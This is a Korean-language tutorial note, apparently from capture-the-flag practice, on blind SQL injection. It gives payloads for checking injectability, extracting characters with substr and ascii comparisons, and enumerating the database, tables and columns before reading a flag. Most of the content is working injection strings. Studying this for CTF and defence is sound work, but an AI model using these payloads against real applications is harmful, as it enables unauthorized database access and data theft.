# Blind SQL Injection Process

### **Blind SQL Injection 공격 순서**

&#x20;

#### 1. SQL Injection Point 찾기

참과 거짓 조건을 통해 SQLi가 가능한지 여부를 체크한다.

&#x20;

normaltic' and ('1'='1') and '1' = '1\
normaltic' and ('1'='2') and '1' = '1

&#x20;

&#x20;

#### 2. Select 문구가 먹히는지 확인

normaltic' and ((select 'test')='test') and '1' = '1

&#x20;

&#x20;

#### 3. 공격 Format을 준비한다.

normaltic' and (<mark style="color:red;">❤</mark>) and '1' = '1

<mark style="color:red;">❤</mark> 부분에 조건을 넣을 수 있다.

&#x20;

&#x20;

#### 4. substr함수를 이용하여 한 글자씩 찾아낸다.

&#x20;

<mark style="color:red;">**substr()**</mark> : 글자를 잘라주는 함수

예시) 글자가 test 일 때,\
&#x20; substr('test',1,1) -> 't'\
&#x20; substr('test',1,2) -> 'te'\
&#x20; substr('test',2,1) -> 'e'

&#x20;

sebstr((<mark style="color:red;">❤</mark>),1,1)\
<mark style="color:red;">❤</mark> 에 SQL Select문을 넣는다.

sebstr((select 'test'),1,1) = 't'

&#x20;

normaltic' and (<mark style="color:red;">**substr**</mark>((select 'test'),1,1) = 't') and '1' = '1

&#x20;

&#x20;

#### 5. ascii 코드를 활용하여 한 글자씩 찾아낸다.

&#x20;

normaltic' and (<mark style="color:red;">**ascii**</mark>(substr((<mark style="color:red;">❤</mark>),1,1)) > 0) and '1' = '1

normaltic' and (<mark style="color:red;">**ascii**</mark>(substr((<mark style="background-color:red;">select 'normaltic'</mark>),1,1)) <mark style="color:red;">**> 70**</mark>) and '1' = '1

&#x20;

글자를 숫자로 대입이 가능한 **ascii 코드**를 활용한다.

업다운 게임 방식으로 빠르게 찾을 수 있다.

\
예시) 100 이하의 숫자 빠르게 찾기

50 > 75 > 87 > ...

&#x20;

ascii('a') = 97

&#x20;

<figure><img src="https://blog.kakaocdn.net/dn/wgqHj/btsE7plGoF0/WkFRERscu7wX04oJf5GCP0/img.png" alt=""><figcaption></figcaption></figure>

&#x20;

#### 6. DB 찾기 : <mark style="background-color:blue;">select database()</mark>

&#x20;

normaltic' and (ascii(substr((<mark style="color:red;">**select database()),1,1**</mark>)) > 70) and '1' = '1

&#x20;

&#x20;

#### 7. table 찾기

: <mark style="color:blue;">**select table\_name from information\_schema.tables where table\_schema = "DB이름" limit 0,1**</mark>

&#x20;

normaltic' and (ascii(substr((<mark style="color:red;">**select table\_name from information\_schema.tables where table\_schema = "DB이름" limit 0,1**</mark>)) > 70) and '1' = '1

&#x20;

&#x20;

#### 8. Column 찾기

: <mark style="color:blue;">**select column\_name from information\_schema.columns**</mark>\ <mark style="color:blue;">**where table\_name = '테이블이름' limit 0,1**</mark>

&#x20;

normaltic' and (ascii(substr((<mark style="color:red;">**select column\_name from information\_schema.columns**</mark>\ <mark style="color:red;">**where table\_name = '테이블이름' limit 0,1**</mark>)) > 70) and '1' = '1

&#x20;

&#x20;

#### 9. DATA 확인

\[추출식] : select flag from <mark style="color:red;">**flagTable**</mark> limit 0,1

\[대입] : normaltic' and (ascii(substr((select <mark style="color:red;">**flag**</mark> from <mark style="color:red;">**flagTable**</mark> limit 0,1),1,1)) > 0) and '1' = '1

&#x20;

Flag가 있는 **테이블 네임과 컬럼을 활용**하여 데이터 추출을 진행한다.

&#x20;

***

&#x20;

&#x20;

Blind SQL Injection이 처음이라면, 꼭 수동으로 풀어보자.

그 이후 Burp의 리피터 혹은 Python 등으로 자동화 구축해서 진행하자.
